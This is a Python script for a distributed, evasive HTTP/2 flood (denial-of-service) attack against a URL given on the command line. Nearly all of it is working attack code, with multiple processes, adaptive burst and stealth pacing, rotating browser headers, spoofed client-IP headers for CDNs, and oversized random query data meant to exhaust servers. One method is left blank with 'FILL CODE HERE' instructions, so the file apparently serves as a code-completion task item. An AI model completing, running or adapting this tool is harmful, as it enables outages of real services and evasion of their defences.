# cloud_http2_flood.py - Advanced/Evasive HTTP/2 Flood Attack
# This script demonstrates advanced attack techniques including:
# - Multi-process distributed attacks
# - User-Agent rotation and request diversification  
# - Enhanced evasion capabilities
# - Production-grade attack simulation

import httpx
import asyncio
import threading
import time
import sys
import os
import random
import string
import multiprocessing
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# --- Enhanced Configuration ---
# Get target URL from command-line arguments
if len(sys.argv) < 2:
    print("Usage: python cloud_http2_flood.py <URL> [connections_per_process] [process_count]")
    sys.exit(1)

target_url = sys.argv[1]
# Enhanced connection architecture with environment variable support
tcp_connections = int(os.getenv("CONNECTIONS", sys.argv[2] if len(sys.argv) > 2 else "4"))
streams_per_connection = int(os.getenv("STREAMS", "256"))
# Get process count for multi-process distribution
process_count = int(sys.argv[3]) if len(sys.argv) > 3 else 2

total_streams_per_process = tcp_connections * streams_per_connection
print(f"Enhanced HTTP/2 Attack Configuration:")
print(f"Target: {target_url}")
print(f"TCP Connections per process: {tcp_connections}")
print(f"Streams per connection: {streams_per_connection}")
print(f"Total streams per process: {total_streams_per_process}")
print(f"Processes: {process_count}")
print(f"Global stream capacity: {total_streams_per_process * process_count}")

# Realistic User-Agent pool for request diversification
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
]

# HTTP methods for multi-vector attacks - server only supports GET
http_methods = ['GET']

# Target endpoints for diversified attacks
target_endpoints = ['/'] # can add here more target endpoints

# Global counters
successful_requests = 0
connection_count = 0
running = True

class AdaptiveStreamManager:
    """
    Intelligent stream management for evasion and optimization.
    Dynamically adjusts stream count based on server response patterns.
    """
    
    def __init__(self, base_streams, connection_id, max_streams=1000):
        self.base_streams = base_streams
        self.connection_id = connection_id
        self.max_streams = max_streams
        self.current_streams = base_streams
        
        # Performance tracking
        self.success_count = 0
        self.error_count = 0
        self.response_times = []
        self.last_adjustment = time.time()
        
        # Adaptive patterns
        self.burst_mode = False
        self.stealth_mode = False
        
        # Smart learning rate scaling - prevent chaos with many connections
        base_interval = max(8, 15 - (tcp_connections / 10))  # Faster learning, but scaled
        self.adjustment_interval = random.uniform(base_interval, base_interval * 1.8)  # Tighter range
    
    def should_send_request(self):
        """
        Intelligent request throttling based on connection health.
        FILL CODE HERE:
        1. Calculate the success ratio of requests.
        2. If the success ratio is below 15%, enter "stealth mode" and reduce streams.
        3. If the success ratio is above 60%, enter "burst mode" and increase streams.
        4. Otherwise, maintain a balanced stream count.
        """
        # FILL CODE HERE
    
    def record_success(self, response_time=None):
        """
        Record successful request for adaptive learning.
        """
        self.success_count += 1
        if response_time:
            self.response_times.append(response_time)
            # Shorter memory for faster adaptation
            if len(self.response_times) > 60:
                self.response_times = self.response_times[-30:]
        
        self._maybe_adjust_strategy()
    
    def record_error(self):
        """
        Record failed request for adaptive learning.
        """
        self.error_count += 1
        self._maybe_adjust_strategy()
    
    def _maybe_adjust_strategy(self):
        """
        Periodically adjust attack strategy based on performance.
        """
        now = time.time()
        if now - self.last_adjustment < self.adjustment_interval:
            return
        
        self.last_adjustment = now
        total_requests = self.success_count + self.error_count
        
        if total_requests < 10:
            return  # Not enough data yet
        
        success_rate = self.success_count / total_requests
        avg_response_time = sum(self.response_times[-12:]) / len(self.response_times[-12:]) if self.response_times else 1.0
        
        # Adaptive strategy adjustment with burst mode persistence
        if success_rate > 0.85 and avg_response_time < 2.0:  # Slightly higher bar for burst entry
            # Server handling well, increase pressure
            self.current_streams = min(self.max_streams, int(self.current_streams * 1.4))  # More aggressive scaling
            self.burst_mode = True
            self.stealth_mode = False
        
        elif success_rate < 0.3 or avg_response_time > 8.0:  # Lower bar for stealth (was 0.4)
            # Server truly struggling (5-8s response times are GOOD for DDoS - maintain pressure)
            self.current_streams = max(1, int(self.current_streams * 0.65))  # Faster reduction when needed
            self.stealth_mode = True
            self.burst_mode = False
        
        else:
            # Balanced performance - but MAINTAIN burst if already active
            self.current_streams = int(self.base_streams * (0.8 + 0.4 * success_rate))
            # Burst mode persistence: don't exit burst easily, only exit stealth easily
            if self.stealth_mode:
                self.stealth_mode = False  # Exit stealth mode readily
            # Keep self.burst_mode unchanged - let it persist
        
        # Reset adjustment interval with smart scaling
        base_interval = max(8, 12 - (tcp_connections / 15))  # Scale with connection count
        self.adjustment_interval = random.uniform(base_interval, base_interval * 2.2)
    
    def get_request_delay(self):
        """
        Get intelligent delay between requests for evasion - surgically optimized for maximum aggression.
        """
        if self.stealth_mode:
            return random.uniform(0.2, 0.8)  # Keep stealth unchanged for evasion integrity
        elif self.burst_mode:
            return random.uniform(0.002, 0.015)  # 2x more aggressive burst (was 0.005-0.03)
        else:
            return random.uniform(0.01, 0.08)  # Faster baseline (was 0.02-0.12)

def generate_random_block_data():
    """
    Generates variable-size random data to exhaust server resources.
    Creates realistic-looking parameters with different sizes and patterns.
    """
    # Generate variable payload sizes (small to large)
    size_category = random.choice(['small', 'medium', 'large', 'xlarge'])
    
    if size_category == 'small':
        length = random.randint(50, 200)
    elif size_category == 'medium':
        length = random.randint(200, 1000)
    elif size_category == 'large':
        length = random.randint(1000, 5000)
    else:  # xlarge
        length = random.randint(5000, 20000)
    
    # Mix of different character types for realistic payloads
    chars = string.ascii_letters + string.digits + '_-.'
    random_data = ''.join(random.choice(chars) for _ in range(length))
    
    # Add realistic prefixes to make requests look legitimate
    prefixes = ['user_data_', 'block_', 'transaction_', 'session_', 'cache_', 'temp_']
    if random.random() < 0.4:
        random_data = random.choice(prefixes) + random_data
    
    return random_data

def generate_diversified_headers(connection_id=None, adaptive_mode='normal'):
    """
    Enhanced header generation with advanced connection diversity and evasion.
    Supports adaptive modes for different attack patterns.
    """
    # Base headers with enhanced diversity
    headers = {
        'user-agent': random.choice(user_agents),
        'accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json,text/plain,*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            '*/*',
            'application/json, text/javascript, */*; q=0.01'
        ]),
        'accept-language': random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8',
            'es-ES,es;q=0.9,en;q=0.8',
            'ru-RU,ru;q=0.9,en;q=0.8'
        ]),
        'accept-encoding': random.choice([
            'gzip, deflate, br',
            'gzip, deflate',
            'br, gzip, deflate',
            'deflate, gzip, br'
        ]),
        'cache-control': random.choice([
            'no-cache', 'max-age=0', 'no-store', 'no-cache, no-store',
            'max-age=3600', 'public, max-age=0', 'private, no-cache'
        ])
    }
    
    # Adaptive header modifications based on mode
    if adaptive_mode == 'stealth':
        # Stealth mode: minimal suspicious headers
        headers.update({
            'dnt': '1',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': random.choice(['cross-site', 'same-origin', 'same-site']),
            'sec-fetch-mode': random.choice(['navigate', 'cors', 'no-cors']),
            'sec-fetch-dest': random.choice(['document', 'empty', 'script'])
        })
    elif adaptive_mode == 'burst':
        # Burst mode: aggressive headers for maximum impact
        headers.update({
            'priority': 'u=0, i',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{random.choice(["example.com", "test.org", "demo.net"])}',
            'referer': f'https://{random.choice(["google.com", "bing.com", "duckduckgo.com"])}/search'
        })
    
    # Enhanced connection diversity with more sophisticated headers
    diversity_chance = 0.7 if adaptive_mode == 'burst' else 0.4 if adaptive_mode == 'stealth' else 0.5
    
    if random.random() < diversity_chance:
        # Advanced IP spoofing headers
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        ip_headers = {
            'x-forwarded-for': fake_ip,
            'x-real-ip': fake_ip,
            'x-originating-ip': fake_ip,
            'x-remote-ip': fake_ip,
            'x-cluster-client-ip': fake_ip,
            'cf-connecting-ip': fake_ip,  # Cloudflare header
            'true-client-ip': fake_ip     # Akamai header
        }
        # Add 2-3 IP spoofing headers
        selected_ip_headers = dict(random.sample(list(ip_headers.items()), k=random.randint(2, 3)))
        headers.update(selected_ip_headers)
        
        # Connection fingerprint headers
        fingerprint_headers = {
            'x-request-id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(16, 32))),
            'x-correlation-id': ''.join(random.choices(string.ascii_lowercase + string.digits + '-', k=random.randint(20, 36))),
            'x-trace-id': ''.join(random.choices(string.hexdigits.lower(), k=32)),
            'x-session-id': ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(24, 40))),
            'x-client-id': f"client-{random.randint(1000, 9999)}-{connection_id or 'unknown'}",
            'x-api-key': ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(32, 64))),
            'x-user-token': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits + '._-', k=random.randint(40, 80)))
        }
        # Add 2-4 fingerprint headers
        selected_fingerprint = dict(random.sample(list(fingerprint_headers.items()), k=random.randint(2, 4)))
        headers.update(selected_fingerprint)
        
        # Browser simulation headers
        if random.random() < 0.3:
            browser_headers = {
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': random.choice(['?0', '?1']),
                'sec-ch-ua-platform': f'"{random.choice(["Windows", "macOS", "Linux", "Android", "iOS"])}"',
                'viewport-width': str(random.randint(1024, 1920)),
                'device-memory': str(random.choice([2, 4, 8, 16])),
                'downlink': str(random.uniform(1.0, 10.0))[:4]
            }
            headers.update(dict(random.sample(list(browser_headers.items()), k=random.randint(2, 4))))
    
    # Occasionally add custom application headers for realism
    if random.random() < 0.2:
        app_headers = {
            'x-app-version': f'{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 99)}',
            'x-build-number': str(random.randint(1000, 9999)),
            'x-platform': random.choice(['web', 'mobile', 'desktop', 'tablet']),
            'x-device-type': random.choice(['phone', 'tablet', 'desktop', 'laptop']),
            'x-os-version': f'{random.randint(10, 15)}.{random.randint(0, 9)}',
            'x-browser-version': f'{random.randint(80, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}'
        }
        headers.update(dict(random.sample(list(app_headers.items()), k=random.randint(1, 3))))
    
    return headers

async def enhanced_connection_worker(client, connection_id, process_id):
    """
    Enhanced HTTP/2 attack worker with adaptive stream management.
    Each connection uses intelligent stream allocation and evasion techniques.
    """
    global successful_requests, connection_count
    
    # Initialize adaptive stream manager for this connection
    # Higher max streams but scale with connection count to prevent resource exhaustion
    max_streams_limit = min(1500, 800 + (tcp_connections * 5))  # Smart scaling
    stream_manager = AdaptiveStreamManager(streams_per_connection, connection_id, max_streams=max_streams_limit)
    request_count = 0
    
    while running:
        # Intelligent request throttling based on adaptive algorithm
        if not stream_manager.should_send_request():
            await asyncio.sleep(stream_manager.get_request_delay())
            continue
        
        request_start = time.time()
        try:
            # Select random attack vector with enhanced diversity
            method = random.choice(http_methods)
            endpoint = random.choice(target_endpoints)
            full_url = target_url.rstrip('/') + endpoint
            
            # Generate enhanced attack payload with connection fingerprint
            block_data = generate_random_block_data()
            
            # Determine adaptive header mode based on stream manager state
            header_mode = 'stealth' if stream_manager.stealth_mode else 'burst' if stream_manager.burst_mode else 'normal'
            headers = generate_diversified_headers(connection_id=connection_id, adaptive_mode=header_mode)
            
            # Add connection diversity headers for better evasion
            headers['x-connection-id'] = f"conn-{connection_id}-{request_count}"
            if stream_manager.stealth_mode:
                headers['x-request-priority'] = 'low'
            elif stream_manager.burst_mode:
                headers['x-request-priority'] = 'high'
            
            # Enhanced request preparation with adaptive content types
            if method in ['POST', 'PUT']:
                # Adaptive POST/PUT with intelligent content type selection
                if stream_manager.burst_mode or random.random() < 0.4:
                    headers['content-type'] = 'application/json'
                    data = {
                        'block_data': block_data, 
                        'payload_size': len(block_data), 
                        'connection_id': connection_id,
                        'request_id': request_count,
                        'stream_mode': 'burst' if stream_manager.burst_mode else 'stealth' if stream_manager.stealth_mode else 'normal'
                    }
                else:
                    data = {'block_data': block_data, 'payload_size': len(block_data)}
                response = await client.request(method, full_url, headers=headers, data=data)
            else:
                # Enhanced GET/HEAD/OPTIONS with adaptive query parameters
                params = {
                    'block_data': block_data, 
                    'conn': connection_id,
                    'req': request_count,
                    'mode': 'burst' if stream_manager.burst_mode else 'stealth' if stream_manager.stealth_mode else 'normal'
                }
                response = await client.request(method, full_url, headers=headers, params=params)
            
            # Calculate response time for adaptive learning
            response_time = time.time() - request_start
            request_count += 1
            
            # Enhanced response handling with adaptive feedback
            if 200 <= response.status_code < 400:
                successful_requests += 1
                connection_count += 1
                stream_manager.record_success(response_time)
                
                # Enhanced progress reporting with adaptive intelligence
                if successful_requests % 200 == 0:
                    try:
                        if method == 'GET' and response.headers.get('content-type', '').startswith('application/json'):
                            result = response.json()
                            mode_info = f"[{'BURST' if stream_manager.burst_mode else 'STEALTH' if stream_manager.stealth_mode else 'NORMAL'}]"
                            print(f"[Process {process_id}|Conn {connection_id}] {mode_info} HTTP/2 Stream: Block={result.get('block_data', '')[:12]}..., Method={method}, RT={response_time:.2f}s")
                    except:
                        pass
            else:
                stream_manager.record_error()

        except (httpx.RequestError, asyncio.TimeoutError) as e:
            # Smart error handling - differentiate real failures from protocol stress
            error_msg = str(e).lower()
            if 'timeout' in error_msg or 'connection refused' in error_msg or 'network' in error_msg:
                # Real network issues - record as error
                stream_manager.record_error()
                await asyncio.sleep(stream_manager.get_request_delay() * 2)  # Adaptive backoff
            else:
                # Protocol-level issues - minimal delay, keep pressure up
                await asyncio.sleep(0.01)
        except Exception as e:
            # Smart exception handling - protocol crashes are SUCCESS indicators!
            error_msg = str(e).lower()
            if any(keyword in error_msg for keyword in ['taskgroup', 'keyerror', 'stream', 'h2', 'http2']):
                # HTTP/2 protocol stress = server struggling = SUCCESS!
                stream_manager.record_success(response_time=0.1)
                await asyncio.sleep(0.01)  # Minimal delay - maintain pressure!
            else:
                # Other real errors
                stream_manager.record_error()
                await asyncio.sleep(0.1)
        
        # Adaptive delay between requests for better evasion
        await asyncio.sleep(stream_manager.get_request_delay())

async def run_enhanced_http2_attack(process_id):
    """
    Enhanced HTTP/2 attack function with multiple TCP connections.
    Each connection is independent with dedicated streams.
    """
    print(f"[Process {process_id}] Starting {tcp_connections} independent HTTP/2 connections")
    
    # Create individual HTTP/2 clients for TCP connection diversity
    connection_tasks = []
    
    for connection_id in range(tcp_connections):
        # Individual connection configuration with connection-specific limits
        limits = httpx.Limits(
            max_keepalive_connections=1,  # Force separate TCP connections
            max_connections=1,           # One TCP connection per client
            keepalive_expiry=60.0        # Extended keepalive for sustained attack
        )
        
        # Enhanced timeout configuration for sustained operations
        timeout = httpx.Timeout(
            connect=15.0,   # Allow time for connection establishment
            read=20.0,      # Extended read timeout for large responses
            write=15.0,     # Extended write timeout for large payloads
            pool=5.0        # Faster connection pool timeout
        )
        
        # Force HTTP/2-only transport with enhanced settings
        transport = httpx.AsyncHTTPTransport(
            http2=True, 
            http1=False,  # Strict HTTP/2 enforcement
            limits=limits,
            retries=3     # Connection retry for resilience
        )
        
        # Create independent async client for each TCP connection
        client = httpx.AsyncClient(
            transport=transport,
            timeout=timeout,
            follow_redirects=True,
            verify=False,
            headers={'Connection': 'keep-alive'}  # Ensure persistent connections
        )
        
        # Create task for this connection
        task = asyncio.create_task(enhanced_connection_worker(client, connection_id, process_id))
        connection_tasks.append((task, client))
    
    try:
        # Run all connections concurrently
        tasks_only = [task for task, _ in connection_tasks]
        await asyncio.gather(*tasks_only)
    except KeyboardInterrupt:
        print(f"[Process {process_id}] Shutting down connections gracefully...")
        # Cancel all connection tasks
        for task, client in connection_tasks:
            task.cancel()
            await client.aclose()
        await asyncio.gather(*[task for task, _ in connection_tasks], return_exceptions=True)
    finally:
        # Ensure all clients are properly closed
        for _, client in connection_tasks:
            await client.aclose()

def enhanced_attack_process_worker(process_id):
    """
    Enhanced worker function for each attack process.
    Runs the enhanced HTTP/2 attack with multiple TCP connections.
    """
    print(f"[Process {process_id}] Initializing enhanced HTTP/2 attack")
    print(f"[Process {process_id}] Configuration: {tcp_connections} TCP connections, {streams_per_connection} streams each")
    
    try:
        asyncio.run(run_enhanced_http2_attack(process_id))
    except KeyboardInterrupt:
        print(f"[Process {process_id}] Enhanced attack interrupted gracefully")
    except Exception as e:
        print(f"[Process {process_id}] Enhanced attack error: {e}")

def print_enhanced_attack_statistics():
    """
    Enhanced statistics reporting for advanced HTTP/2 cloud attack.
    Provides detailed insights into adaptive behavior and connection diversity.
    """
    global successful_requests, connection_count
    last_requests = 0
    last_connections = 0
    start_time = time.time()
    
    print(f"\n{'='*80}")
    print(f"{'🚀 ENHANCED HTTP/2 CLOUD ATTACK STATISTICS':^80}")
    print(f"{'='*80}")
    
    while running:
        time.sleep(3)  # Slightly longer interval for more stable measurements
        
        current_time = time.time()
        elapsed_time = current_time - start_time
        
        # Calculate current metrics
        current_requests = successful_requests
        current_connections = connection_count
        
        req_rate = (current_requests - last_requests) / 3
        conn_rate = (current_connections - last_connections) / 3
        
        # Calculate averages over total time
        avg_req_rate = current_requests / elapsed_time if elapsed_time > 0 else 0
        avg_conn_rate = current_connections / elapsed_time if elapsed_time > 0 else 0
        
        # Enhanced attack efficiency metrics
        streams_per_second = req_rate
        total_theoretical_streams = tcp_connections * streams_per_connection * process_count
        efficiency = (req_rate / total_theoretical_streams * 100) if total_theoretical_streams > 0 else 0
        
        # Format elapsed time
        hours, remainder = divmod(int(elapsed_time), 3600)
        minutes, seconds = divmod(remainder, 60)
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
        # Print comprehensive statistics
        print(f"\n{'─'*80}")
        print(f"⏱️  Runtime: {time_str} | 🎯 Target: {target_url}")
        print(f"{'─'*80}")
        
        # Connection architecture info
        print(f"🔗 Architecture: {tcp_connections} TCP connections × {streams_per_connection} streams × {process_count} processes")
        print(f"📊 Theoretical Max: {total_theoretical_streams} concurrent streams")
        
        # Real-time performance metrics
        print(f"\n📈 REAL-TIME PERFORMANCE:")
        print(f"   ⚡ Current Rate: {streams_per_second:.1f} streams/sec | {conn_rate:.1f} conn/sec")
        print(f"   📊 Average Rate:  {avg_req_rate:.1f} req/sec | {avg_conn_rate:.1f} conn/sec")
        print(f"   ⚖️  Efficiency:    {efficiency:.1f}% of theoretical maximum")
        
        # Cumulative statistics
        print(f"\n📋 CUMULATIVE TOTALS:")
        print(f"   ✅ Successful Requests: {current_requests:,}")
        print(f"   🔄 Total Connections:  {current_connections:,}")
        
        # Advanced metrics
        if current_requests > 0:
            avg_requests_per_conn = current_requests / max(current_connections, 1)
            print(f"   📈 Avg Req/Connection:  {avg_requests_per_conn:.1f}")
        
        # Attack pattern indicators
        if streams_per_second > 100:
            print(f"   🚨 HIGH INTENSITY: Attack running at {streams_per_second:.0f} streams/sec")
        elif streams_per_second > 50:
            print(f"   ⚡ MEDIUM INTENSITY: Sustained rate of {streams_per_second:.0f} streams/sec")
        elif streams_per_second > 0:
            print(f"   🎯 STEALTH MODE: Low profile at {streams_per_second:.0f} streams/sec")
        else:
            print(f"   ⏸️  ADAPTIVE PAUSE: Waiting for optimal conditions")
        
        print(f"{'─'*80}")
        
        # Update for next iteration
        last_requests = current_requests
        last_connections = current_connections
    
    print(f"\n{'='*80}")
    print(f"{'🏁 ENHANCED HTTP/2 ATTACK COMPLETED':^80}")
    print(f"{'='*80}")
    print(f"Final Results: {successful_requests:,} successful requests across {connection_count:,} connections")
    print(f"Attack Duration: {time.time() - start_time:.1f} seconds")
    print(f"{'='*80}\n")

def main():
    """
    Enhanced main function coordinating multi-process HTTP/2 cloud attack.
    Features adaptive stream management and advanced evasion techniques.
    """
    global running
    
    print(f"\n{'='*80}")
    print(f"{'🚀 ENHANCED DISTRIBUTED HTTP/2 CLOUD ATTACK':^80}")
    print(f"{'='*80}")
    print(f"🎯 Target: {target_url}")
    print(f"🏭 Process Architecture: {process_count} independent processes")
    print(f"🔗 Connection Model: {tcp_connections} TCP connections per process")
    print(f"🌊 Stream Configuration: {streams_per_connection} streams per connection")
    print(f"📊 Total Theoretical Capacity: {process_count * tcp_connections * streams_per_connection:,} concurrent streams")
    print(f"🧠 Advanced Features: Adaptive stream management, connection diversity, multi-vector attacks")
    print(f"⚡ Evasion Techniques: Dynamic headers, IP spoofing, browser simulation, adaptive throttling")
    print(f"🎮 Control: Press Ctrl+C to gracefully stop the attack")
    print(f"{'='*80}")
    
    # Start enhanced statistics thread
    stats_thread = threading.Thread(target=print_enhanced_attack_statistics, daemon=True)
    stats_thread.start()
    
    # Create and start attack processes
    processes = []
    
    try:
        for process_id in range(process_count):
            p = multiprocessing.Process(
                target=enhanced_attack_process_worker, 
                args=(process_id,)
            )
            p.start()
            processes.append(p)
        
        # Wait for all processes
        for p in processes:
            p.join()
            
    except KeyboardInterrupt:
        print("\n[MAIN] Stopping all attack processes...")
        running = False
        
        # Terminate all processes
        for p in processes:
            p.terminate()
            p.join(timeout=5)
        
        print("[MAIN] All processes stopped.")
        print(f"[FINAL] Total successful requests: {successful_requests}")

if __name__ == "__main__":
    # Enable multiprocessing on all platforms
    multiprocessing.set_start_method('spawn', force=True)
    main()
